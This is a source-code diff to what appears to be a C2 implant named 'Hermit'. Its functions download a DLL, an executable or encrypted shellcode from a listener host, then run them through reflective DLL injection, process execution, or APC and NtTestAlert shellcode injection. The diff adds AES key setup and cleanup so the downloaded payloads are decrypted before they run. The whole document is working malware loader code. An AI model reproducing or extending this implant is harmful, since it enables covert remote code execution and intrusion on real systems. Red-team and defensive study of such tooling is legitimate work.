@@ -10,6 +10,7 @@ namespace Hermit
             return;
 
         Procs::PPROCS pProcs = Procs::FindProcs(hWinHTTPDLL);
+        Crypt::PCRYPT pCrypt = Crypt::InitCrypt(AES_KEY_BASE64_W, AES_IV_BASE64_W);
 
         HINTERNET hSession = NULL;
         HINTERNET hConnect = NULL;
@@ -25,7 +26,7 @@ namespace Hermit
             LISTENER_PORT
         );
         if (!handlers.hSession || !handlers.hConnect) {
-            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
             return;
         }
 
@@ -40,6 +41,7 @@ namespace Hermit
         // Download a DLL file
         bResults = System::Http::DownloadFile(
             pProcs,
+            pCrypt,
             hConnect,
             LISTENER_HOST_W,
             LISTENER_PORT,
@@ -50,7 +52,7 @@ namespace Hermit
         );
         if (!bResults)
         {
-            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
             return;
         }
 
@@ -68,7 +70,7 @@ namespace Hermit
             Technique::Injection::ReflectiveDLLInjection(dllPath.c_str(), dwDllPathSize);
         }
 
-        Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+        Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
         return;
     }
 
@@ -80,6 +82,7 @@ namespace Hermit
             return;
 
         Procs::PPROCS pProcs = Procs::FindProcs(hWinHTTPDLL);
+        Crypt::PCRYPT pCrypt = Crypt::InitCrypt(AES_KEY_BASE64_W, AES_IV_BASE64_W);
 
         HINTERNET hSession = NULL;
         HINTERNET hConnect = NULL;
@@ -95,7 +98,7 @@ namespace Hermit
             LISTENER_PORT
         );
         if (!handlers.hSession || !handlers.hConnect) {
-            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
             return;
         }
 
@@ -109,6 +112,7 @@ namespace Hermit
         // Download an executable
         bResults = System::Http::DownloadFile(
             pProcs,
+            pCrypt,
             hConnect,
             LISTENER_HOST_W,
             LISTENER_PORT,
@@ -119,7 +123,7 @@ namespace Hermit
         );
         if (!bResults)
         {
-            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
             return;
         }
 
@@ -129,7 +133,7 @@ namespace Hermit
             System::Process::ExecuteFile(execPath);
         }
 
-        Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+        Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
         return;
     }
 
@@ -141,6 +145,7 @@ namespace Hermit
             return;
 
         Procs::PPROCS pProcs = Procs::FindProcs(hWinHTTPDLL);
+        Crypt::PCRYPT pCrypt = Crypt::InitCrypt(AES_KEY_BASE64_W, AES_IV_BASE64_W);
 
         HINTERNET hSession = NULL;
         HINTERNET hConnect = NULL;
@@ -157,7 +162,7 @@ namespace Hermit
             LISTENER_PORT
         );
         if (!handlers.hSession || !handlers.hConnect) {
-            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
             return;
         }
 
@@ -178,7 +183,7 @@ namespace Hermit
         );
         if (!resp.bResult || resp.dwStatusCode != 200)
         {
-            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
             return;
         }
 
@@ -188,12 +193,12 @@ namespace Hermit
         std::wstring wEnc = System::Http::ReadResponseText(pProcs, hRequest);
         if (wEnc.length() == 0)
         {
-            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
             return;
         }
 
         // Decrypt the data
-        std::vector<BYTE> bytes = Crypt::Decrypt(wEnc);
+        std::vector<BYTE> bytes = Crypt::Decrypt(wEnc, pCrypt->pAES->hKey, pCrypt->pAES->iv);
 
         // Target PID
         DWORD dwPID;
@@ -213,19 +218,26 @@ namespace Hermit
             Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(bytes);
         }
 
-        Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+        Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
         return;
     }
 
     VOID Free(
         HMODULE hWinHTTPDLL,
         Procs::PPROCS pProcs,
+        Crypt::PCRYPT pCrypt,
         HINTERNET hSession,
         HINTERNET hConnect,
         HINTERNET hRequest
     ) {
         System::Http::WinHttpCloseHandles(pProcs, hSession, hConnect, hRequest);
+
         delete pProcs;
+        
+        Crypt::Cleanup(pCrypt->pAES->hAlg, pCrypt->pAES->hKey, pCrypt->pAES->pbKeyObj);
+        delete pCrypt->pAES;
+        delete pCrypt;
+        
         FreeLibrary(hWinHTTPDLL);
     }
 }
